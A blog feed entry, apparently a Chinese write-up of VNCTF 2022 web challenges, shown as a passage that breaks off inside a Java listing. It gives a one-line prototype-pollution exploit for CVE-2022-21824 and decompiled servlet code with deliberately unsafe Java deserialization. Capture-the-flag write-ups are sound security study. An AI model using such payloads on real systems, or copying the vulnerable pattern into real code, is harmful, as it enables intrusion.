{
    "version": "https://jsonfeed.org/version/1",
    "title": "M1N's Blog",
    "description": "M1N的博客",
    "home_page_url": "http://blog.m1n.me",
    "items": [
        {
            "id": "http://blog.m1n.me/2022/02/13/VNCTF2022-Web-WP/",
            "url": "http://blog.m1n.me/2022/02/13/VNCTF2022-Web-WP/",
            "title": "VNCTF 2022 WriteUP",
            "date_published": "2022-02-13T13:03:05.000Z",
            "content_html": "<h1 id=\"vnctf-2022-writeup\"><a class=\"markdownIt-Anchor\" href=\"#vnctf-2022-writeup\">#</a> VNCTF 2022 WriteUP</h1>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> Web</h2>\n<h3 id=\"gamev40\"><a class=\"markdownIt-Anchor\" href=\"#gamev40\">#</a> GameV4.0</h3>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105584.png\" alt=\"image-20220212161210388\" class=\"lazyload\"></p>\n<p>BASE64 解密得 flag</p>\n<h3 id=\"newcalc0\"><a class=\"markdownIt-Anchor\" href=\"#newcalc0\">#</a> newcalc0</h3>\n<p>根据 CVE-2022-21824</p>\n<p>exp： <code>console.table([&#123; x : 1 &#125;], [ &quot;__proto__&quot; ]);</code></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105449.png\" alt=\"image-20220212182939249\" class=\"lazyload\"></p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105778.png\" alt=\"image-20220212183005147\" class=\"lazyload\"></p>\n<h3 id=\"easyj4va\"><a class=\"markdownIt-Anchor\" href=\"#easyj4va\">#</a> easyJ4va</h3>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105785.png\" alt=\"image-20220212162237020\" class=\"lazyload\"></p>\n<p>任意文件读取</p>\n<p><img data-fancybox=\"gallery\" data-sizes=\"auto\" data-src=\"https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202202132105124.png\" alt=\"image-20220212162325258\" class=\"lazyload\"></p>\n<p>HelloWorldServlet.class</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs java\"><span class=\"hljs-keyword\">package</span> servlet;<br><br><span class=\"hljs-keyword\">import</span> entity.User;<br><span class=\"hljs-keyword\">import</span> java.io.IOException;<br><span class=\"hljs-keyword\">import</span> java.util.Base64;<br><span class=\"hljs-keyword\">import</span> java.util.Base64.Decoder;<br><span class=\"hljs-keyword\">import</span> javax.servlet.ServletException;<br><span class=\"hljs-keyword\">import</span> javax.servlet.ServletOutputStream;<br><span class=\"hljs-keyword\">import</span> javax.servlet.annotation.WebServlet;<br><span class=\"hljs-keyword\">import</span> javax.servlet.http.HttpServlet;<br><span class=\"hljs-keyword\">import</span> javax.servlet.http.HttpServletRequest;<br><span class=\"hljs-keyword\">import</span> javax.servlet.http.HttpServletResponse;<br><span class=\"hljs-keyword\">import</span> util.Secr3t;<br><span class=\"hljs-keyword\">import</span> util.SerAndDe;<br><br><span class=\"hljs-meta\">@WebServlet(</span><br><span class=\"hljs-meta\">    name = &quot;HelloServlet&quot;,</span><br><span class=\"hljs-meta\">    urlPatterns = &#123;&quot;/evi1&quot;&#125;</span><br><span class=\"hljs-meta\">)</span><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">HelloWorldServlet</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title\">HttpServlet</span> </span>&#123;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">volatile</span> String name = <span class=\"hljs-string\">&quot;m4n_q1u_666&quot;</span>;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">volatile</span> String age = <span class=\"hljs-string\">&quot;666&quot;</span>;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">volatile</span> String height = <span class=\"hljs-string\">&quot;180&quot;</span>;<br>    User user;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-title\">HelloWorldServlet</span><span class=\"hljs-params\">()</span> </span>&#123;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">init</span><span class=\"hljs-params\">()</span> <span class=\"hljs-keyword\">throws</span> ServletException </span>&#123;<br>        <span class=\"hljs-keyword\">this</span>.user = <span class=\"hljs-keyword\">new</span> User(<span class=\"hljs-keyword\">this</span>.name, <span class=\"hljs-keyword\">this</span>.age, <span class=\"hljs-keyword\">this</span>.height);<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">protected</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">doGet</span><span class=\"hljs-params\">(HttpServletRequest req, HttpServletResponse resp)</span> <span class=\"hljs-keyword\">throws</span> ServletException, IOException </span>&#123;<br>        String reqName = req.getParameter(<span class=\"hljs-string\">&quot;name&quot;</span>);<br>        <span class=\"hljs-keyword\">if</span> (reqName != <span class=\"hljs-keyword\">null</span>) &#123;<br>            <span class=\"hljs-keyword\">this</span>.name = reqName;<br>        &#125;<br><br>        <span class=\"hljs-keyword\">if</span> (Secr3t.check(<span class=\"hljs-keyword\">this</span>.name)) &#123;<br>            <span class=\"hljs-keyword\">this</span>.Response(resp, <span class=\"hljs-string\">&quot;no vnctf2022!&quot;</span>);<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">if</span> (Secr3t.check(<span class=\"hljs-keyword\">this</span>.name)) &#123;<br>                <span class=\"hljs-keyword\">this</span>.Response(resp, <span class=\"hljs-string\">&quot;The Key is &quot;</span> + Secr3t.getKey());<br>            &#125;<br><br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">protected</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">doPost</span><span class=\"hljs-params\">(HttpServletRequest req, HttpServletResponse resp)</span> <span class=\"hljs-keyword\">throws</span> ServletException, IOException </span>&#123;<br>        String key = req.getParameter(<span class=\"hljs-string\">&quot;key&quot;</span>);<br>        String text = req.getParameter(<span class=\"hljs-string\">&quot;base64&quot;</span>);<br>        <span class=\"hljs-keyword\">if</span> (Secr3t.getKey().equals(key) &amp;&amp; text != <span class=\"hljs-keyword\">null</span>) &#123;<br>            Decoder decoder = Base64.getDecoder();<br>            <span class=\"hljs-keyword\">byte</span>[] textByte = decoder.decode(text);<br>            User u = (User)SerAndDe.deserialize(textByte);<br>            <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">this</span>.user.equals(u)) &#123;<br>                <span class=\"hljs-keyword\">this</span>.Response(resp, <span class=\"hljs-string\">&quot;Deserialize…… Flag is &quot;</span> + Secr3t.getFlag().toString());<br>            &#125;<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">this</span>.Response(resp, <span class=\"hljs-string\">&quot;KeyError&quot;</span>);<br>        &#125;<br><br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">Response</span><span class=\"hljs-params\">(HttpServletResponse resp, String outStr)</span> <span class=\"hljs-keyword\">throws</span> IOException </span>&#123;<br>        ServletOutputStream out = resp.getOutputStream();<br>        out.write(outStr.getBytes());<br>        out.flush();<br>        out.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n<p>Secr3t.class</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs java\"><span class=\"hljs-comment\">//</span><br><span class=\"hljs-comment\">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class=\"hljs-comment\">// (powered by FernFlower decompiler)</span><br><span class=\"hljs-comment\">//</span><br><br><span class=\"hljs-keyword\">package</span> util;<br><br><span class=\"hljs-keyword\">import</span> java.io.BufferedReader;<br><span class=\"hljs-keyword\">import</span> java.io.IOException;<br><span class=\"hljs-keyword\">import</span> java.io.InputStream;<br><span class=\"hljs-keyword\">import</span> java.io.InputStreamReader;<br><span class=\"hljs-keyword\">import</span> org.apache.commons.lang3.RandomStringUtils;<br><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Secr3t</span> </span>&#123;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> String Key = RandomStringUtils.randomAlphanumeric(<span class=\"hljs-number\">32</span>);<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> StringBuffer Flag;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">private</span> <span class=\"hljs-title\">Secr3t</span><span class=\"hljs-params\">()</span> </span>&#123;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> String <span class=\"hljs-title\">getKey</span><span class=\"hljs-params\">()</span> </span>&#123;<br>        <span class=\"hljs-keyword\">return</span> Key;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> StringBuffer <span class=\"hljs-title\">getFlag</span><span class=\"hljs-params\">()</span> </span>&#123;<br>        Flag = <span class=\"hljs-keyword\">new</span> StringBuffer();<br>        InputStream in = <span class=\"hljs-keyword\">null</span>;<br><br>        <span class=\"hljs-keyword\">try</span> &#123;<br>            in = Runtime.getRuntime().exec(<span class=\"hljs-string\">&quot;/readflag&quot;</span>).getInputStream();<br>        &#125; <span class=\"hljs-keyword\">catch</span> (IOException var12) &#123;<br>            var12.printStackTrace();<br>        &#125;<br><br>        BufferedReader read = <span class=\"hljs-keyword\">new</span> BufferedReader(<span class=\"hljs-keyword\">new</span> InputStreamReader(in));<br><br>        <span class=\"hljs-keyword\">try</span> &#123;<br>            String line = <span class=\"hljs-keyword\">null</span>;<br><br>            <span class=\"hljs-keyword\">while</span>((line = read.readLine()) != <span class=\"hljs-keyword\">null</span>) &#123;<br>                Flag.append(line + <span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>            &#125;<br>        &#125; <span class=\"hljs-keyword\">catch</span> (IOException var13) &#123;<br>            var13.printStackTrace();<br>        &#125; <span class=\"hljs-keyword\">finally</span> &#123;<br>            <span class=\"hljs-keyword\">try</span> &#123;<br>                in.close();<br>                read.close();<br>            &#125; <span class=\"hljs-keyword\">catch</span> (IOException var11) &#123;<br>                var11.printStackTrace();<br>                System.out.println(<span class=\"hljs-string\">&quot;Secr3t : io exception!&quot;</span>);<br>            &#125;<br><br>        &#125;<br><br>        <span class=\"hljs-keyword\">return</span> Flag;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">boolean</span> <span class=\"hljs-title\">check</span><span class=\"hljs-params\">(String checkStr)</span> </span>&#123;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&quot;vnctf2022&quot;</span>.equals(checkStr);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n<p>SerAndDe.class</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs java\"><span class=\"hljs-keyword\">package</span> util;<br><br><span class=\"hljs-keyword\">import</span> java.io.ByteArrayInputStream;<br><span class=\"hljs-keyword\">import</span> java.io.ByteArrayOutputStream;<br><span class=\"hljs-keyword\">import</span> java.io.IOException;<br><span class=\"hljs-keyword\">import</span> java.io.ObjectInputStream;<br><span class=\"hljs-keyword\">import</span> java.io.ObjectOutputStream;<br><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">SerAndDe</span> </span>&#123;<br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">private</span> <span class=\"hljs-title\">SerAndDe</span><span class=\"hljs-params\">()</span> </span>&#123;<br>    &#125;<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">byte</span>[] serialize(Object object) &#123;<br>        ObjectOutputStream oos = <span class=\"hljs-keyword\">null</span>;<br>        ByteArrayOutputStream bos = <span class=\"hljs-keyword\">null</span>;<br><br>        Object var4;<br>        <span class=\"hljs-keyword\">try</span> &#123;<br>            bos = <span class=\"hljs-keyword\">new</span> ByteArrayOutputStream();<br>            oos = <span class=\"hljs-keyword\">new</span> ObjectOutputStream(bos);<br>            oos.writeObject(object);<br>            <span class=\"hljs-keyword\">byte</span>[] b = bos.toByteArray();<br>            <span class=\"hljs-keyword\">byte</span>[] var16 = b;<br>            <span class=\"hljs-keyword\">return</span> var16;<br>        &#125; <span class=\"hljs-keyword\">catch</span> (IOException var14) &#123;<br>            System.out.println(<span class=\"hljs-string\">&quot;serialize Exception:&quot;</span> + var14.toString());<br>            var4 = <span class=\"hljs-keyword\">null</span>;<br>        &#125; <span class=\"hljs-keyword\">finally</span> &#123;<br>            <span class=\"hljs-keyword\">try</span> &#123;<br>                <span class=\"hljs-keyword\">if</span> (oos != <span class=\"hljs-keyword\">null</span>) &#123;<br>                    oos.close();<br>                &#125;<br><br>                <span class=\"hljs-keyword\">if</span> (bos != <span class=\"hljs-keyword\">null</span>) &#123;<br>                    bos.close();<br>                &#125;<br>            &#125; <span class=\"hljs-keyword\">catch</span> (IOException var13) &#123;<br>                System.out.println(<span class=\"hljs-string\">&quot;io could not close:&quot;</span> + var13.toString());<br>            &#125;<br><br>        &#125;<br><br>        <span class=\"hljs-keyword\">return</span> (<span class=\"hljs-keyword\">byte</span>[])var4;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> Object <span class=\"hljs-title\">deserialize</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">byte</span>[] bytes)</span> </span>&#123;<br>        ByteArrayInputStream bais = <span class=\"hljs-keyword\">null</span>;<br><br>        Object var3;<br>        <span class=\"hljs-keyword\">try</span> &#123;<br>            bais = <span class=\"hljs-keyword\">new</span> ByteArrayInputStream(bytes);<br>            ObjectInputStream ois = <span class=\"hljs-keyword\">new</span> ObjectInputStream(bais);<br>            var3 = ois.readObject();<br>            <span class=\"hljs-keyword\">return</span> var3;<br>        &#125; <span class=\"hljs-keyword\">catch</span> (IOException | ClassNotFoundException var13) &#123;<br>            System.out.println(<span class=\"hljs-string\">&quot;deserialize Exception:&quot;</span> + var13.toString());<br>            var3 = <span class=\"hljs-keyword\">null</span>;<br>        &#125; <span class=\"hljs-keyword\">finally</span> &#123;<br>            <span class=\"hljs-keyword\">try</span> &#123;<br>                <span class=\"hljs-keyword\">if</span> (bais != <span class=\"hljs-keyword\">null</span>) &#123;<br>                    bais.close();<br>                &#125;<br>            &#125; <span class=\"hljs-keyword\">catch</span> (IOException var12) &#123;<br>                System.out.println(<span class=\"hljs-string\">&quot;LogManage Could not serialize:&quot;</span> + var12.toString());<br>            &#125;<br><br>        &#125;<br><br>        <span class=\"hljs-keyword\">return</span> var3;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n<p>User.class</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs java\"><span class=\"hljs-keyword\">package</span> entity;<br><br><span class=\"hljs-keyword\">import</span> java.io.IOException;<br><span class=\"hljs-keyword\">import</span> java.io.ObjectInputStream;<br><span class=\"hljs-keyword\">import</span> java.io.Serializable;<br><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">User</span> <span class=\"hljs-keyword\">implements</span> <span class=\"hljs-title\">Serializable</span> </span>&#123;<br>    <span class=\"hljs-keyword\">private</span> String name;<br>    <span class=\"hljs-keyword\">private</span> String age;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">transient</span> String height;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-title\">User</span><span class=\"hljs-params\">(String name, String age, String height)</span> </span>&#123;<br>        <span class=\"hljs-keyword\">this</span>.name = name;<br>        <span class=\"hljs-keyword\">this</span>.age = age;<br>        <span class=\"hljs-keyword\">this</span>.height = height;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title\">getName</span><span class=\"hljs-params\">()</span> </span>&#123;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">this</span>.name;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setName</span><span class=\"hljs-params\">(String name)</span> </span>&#123;<br>        <span class=\"hljs-keyword\">this</span>.name = name;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title\">getAge</span><span class=\"hljs-params\">()</span> </span>&#123;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">this</span>.age;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setAge</span><span class=\"hljs-params\">(String age)</span> </span>&#123;<br>        <span class=\"hljs-keyword\">this</span>.age = age;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title\">getHeight</span><span class=\"hljs-params\">()</span> </span>&#123;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">this</span>.height;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">setHeight</span><span class=\"hljs-params\">(String height)</span> </span>&#123;<br>        <span class=\"hljs-keyword\">this</span>.height = height;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">readObject</span><span class=\"hljs-params\">(ObjectInputStream s)</span> <span class=\"hljs-keyword\">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        s.defaultReadObject();<br>        <span class=\"hljs-keyword\">this</span>.height = (String)s.readObject();<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">boolean</span> <span class=\"hljs-title\">equals</span><span class=\"hljs-params\">(Object obj)</span> </span>&#123;<br>        <span class=\"hljs-keyword\">if</span> (obj == <span class=\"hljs-keyword\">null</span>) &#123;<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">false</span>;<br>        &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">this</span> == obj) &#123;<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">true</span>;<br>        &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (obj <span class=\"hljs-keyword\">instanceof</span> User) &#123;<br>            User user = (User)obj;<br>            <span class=\"hljs-keyword\">return</span> user.getAge().equals(<span class=\"hljs-keyword\">this</span>.age) &amp;&amp; user.getHeight().equals(<span class=\"hljs-keyword\">this</span>.height) &amp;&amp; user.getName().equals(<span class=\"hljs-keyword\">this</span>.name);<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title\">toString</span><span class=\"hljs-params\">()</span> </span>&#123;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&quot;User&#123;name=&#x27;&quot;</span> + <span class=\"hljs-keyword\">this</span>.name + <span class=\"hljs-string\">&#x27;\\&#x27;&#x27;</span> + <span class=\"hljs-string\">&quot;, age=&#x27;&quot;</span> + <span class=\"hljs-keyword\">this</span>.age + <span class=\"hljs-string\">&#x27;\\&#x27;&#x27;</span> + <span class=\"hljs-string\">&quot;, height=&#x27;&quot;</span> + <span class=\"hljs-keyword\">this</span>.height + <span class=\"hljs-string\">&#x27;\\&#x27;&#x27;</span> + <span class=\"hljs-string\">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n<p>UrlUtil.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs java\"><span class=\"hljs-keyword\">package</span> util;<br><br><span class=\"hljs-keyword\">import</span> java.io.*;<br><span class=\"hljs-keyword\">import</span> java.net.*;<br><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">UrlUtil</span></span><br><span class=\"hljs-class\"></span>&#123;<br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">private</span> <span class=\"hljs-title\">UrlUtil</span><span class=\"hljs-params\">()</span> </span>&#123;<br>    &#125;<br>    <br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> 